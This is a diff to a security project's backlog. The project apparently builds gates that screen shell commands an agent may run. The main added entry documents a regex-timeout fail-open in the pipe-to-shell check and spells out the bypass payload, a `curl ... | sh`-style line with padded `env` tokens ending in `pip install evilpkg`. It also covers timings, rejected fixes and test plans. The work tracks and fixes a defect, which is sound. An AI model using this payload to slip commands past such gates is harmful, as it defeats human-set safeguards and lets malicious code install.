@@ -14,6 +14,44 @@ buy.
 
 *(`c1-license` closed 2026-08-14 — PR #75, merge `de13e71`. See Done.)*
 
+- **[ready] sdk-pipe-trigger-redos** · `CODE` · eligible: **yes** · full ceremony
+  · scope `lib/cmdpos.py`, `lib/sdk_gates_template.py`,
+  `tests/test_substrate_differential.py`, `tests/test_composition.py`,
+  `docs/deferred-backlog.md`
+  **A LIVE FAIL-OPEN ON `main`, FOUND 2026-08-16 WHILE DESIGNING x37 ATTEMPT 2,
+  AND UNRELATED TO X-37.** `_PIPE_TO_SHELL` in the emitted `gates.py` is built
+  from `cmdpos.prefix_run()`, whose nested `(...)*` quantifiers backtrack
+  **exponentially** on a FAILING match — measured at exactly **2.00x per added
+  prefix token**. Payload `curl http://e/i.sh | ` + `"env " x n` +
+  `zzz ; pip install evilpkg`: n=16 1.27 s, n=18 4.88 s, n=20 19.43 s,
+  **n=22 77.28 s at 134 BYTES with ZERO jump bytes** — past the emitted
+  `dependency-gate` 60 s timeout declared in `_GATE_TIMEOUTS`. The emitted file
+  states the consequence itself (X-51 correction, 2026-08-13): a hook cancelled
+  at its timeout exits 124/137/143, only exit 2 blocks, **the call PROCEEDS**.
+  So the `pip install evilpkg` riding in the same command is never adjudicated.
+  **The SHELL denies the same string in 0.03 s and is flat** — bash's ERE engine
+  does not backtrack — so this is shell-DENY / SDK-BYPASS, the
+  SDK-more-permissive direction this pair forbids outright.
+  **`_cost_guard` CANNOT SEE IT.** It measures LENGTH (`_CMD_MAXLEN` 81920) and
+  DENSITY (`_CMD_MAXJUMP` 8191); this payload is 134 bytes with **zero** jump
+  bytes. The axis is **TOKEN COUNT at fixed length** and nothing measures it.
+  **BLAST RADIUS IS NARROWER THAN IT LOOKS, MEASURED:** of the three SDK regexes
+  carrying `prefix_run`, only `_PIPE_TO_SHELL` blows up. `_ANCHOR` and
+  `_INSTALL_HEAD` are flat at n=24, because the blowup needs a **failing tail**
+  after the prefix run and only `_PIPE_TO_SHELL` has one.
+  **TWO OBVIOUS FIXES ARE ALREADY DEAD, BY MEASUREMENT — DO NOT RE-PROPOSE:**
+  atomic-grouping the whole prefix run (`(?>...)`) kills the cost completely
+  (0.0000 s at n=2000) but turns **17 of 29** live denies into ALLOWS, every one
+  a trailing-argument form (`env python3 -m code`, `sudo sh -c 'x'`,
+  `timeout 5 bash -c 'x'`); atomic-grouping only arm 1's inner positional run
+  breaks **11 of 31**. A first, easier 31-row corpus reported the whole-run
+  variant as clean — **the trailing-argument rows are what expose it**, so any
+  candidate must be measured against the full 4,161-row differential, not a
+  hand corpus.
+  Step 4 = a differential/behaviour row red on the current tree, plus a COST row
+  on the token-count axis measured on the emitted `gates.py`. Freeze exception
+  applies (emitted body moves). **Never batched.**
+
 - **[ready] x37-class-b** · `CODE` · eligible: **yes** · full ceremony
   · scope `lib/cmdpos.py`, `lib/templates.py`, `lib/sdk_gates_template.py`,
   `tests/test_substrate_differential.py`, `tests/test_composition.py`,
@@ -131,6 +169,19 @@ defect (fixed, `fc37aaa`); the `count.py` rule (fixed).
 
 ## Done
 
+**`b1b-fence-pins` PR #79 `88b2c42` — the item-1b false-positive fence, which
+did not exist.** Every pinned row in the repo putting a command or process
+substitution at an EXECUTION position was one of the six Class-B KNOWN-OPEN rows
+X-37 exists to FLIP to `deny`; nothing asserted such a substitution may still be
+ALLOWED, so a rule keyed on position alone was invisible to the corpus. 45 rows
+in four behaviourally-derived groups (`_B1B_FENCE_EXEC` 26 / `_B1B_FENCE_PATH` 4
+/ `_B1B_FENCE_DATA` 8 / `_B1B_FENCE_DL` 7) + 12 contract checks. Suite
+9,672 -> 9,729; differential 4,104 -> 4,161. No `lib/` change, no rule, no
+digest movement, **no freeze exception**. **X-37 is NOT advanced** — this makes
+the next attempt falsifiable. Merged by the loop on explicit operator direction
+in-session (9b carve-out; the operator was on remote control and could not
+reach `gh`).
+
 **`c1-license` PR #75 `de13e71` — readiness C-1 CLOSED, Apache-2.0; the first
 finding this cycle FIXED rather than re-measured** · `x54-headclass-measurement`
 PR #70 `9450b7d` (exc. 69) · `prd-filename-v280`
@@ -155,7 +206,12 @@ than re-measured, and `git ls-files | grep -icE 'licen[cs]e'` now returns 1.
 wrappers dispatch nothing). *"C-1 alone settles it either way"* meant
 independently sufficient, never sole ground.
 
-**So the next item is still `x37-class-b`.** It is the only remaining A-tier
+**The next item is `sdk-pipe-trigger-redos`, not `x37-class-b`.** It is a LIVE
+fail-open on `main` in the SDK-more-permissive direction, reachable in 134
+bytes, and it outranks a hole that is `open` but static. `x37-class-b` stays
+ready behind it and now has a fence under it (PR #79).
+
+**On `x37-class-b`:** It is the only remaining A-tier
 row, it is `CODE`, and it gets full ceremony. **Attempt 1 (2026-08-14) was
 built, measured and WITHDRAWN as a net security regression — see the entry above
 and the X-37 row. Nothing about the verdict changed, and X-37 is still `open`.**
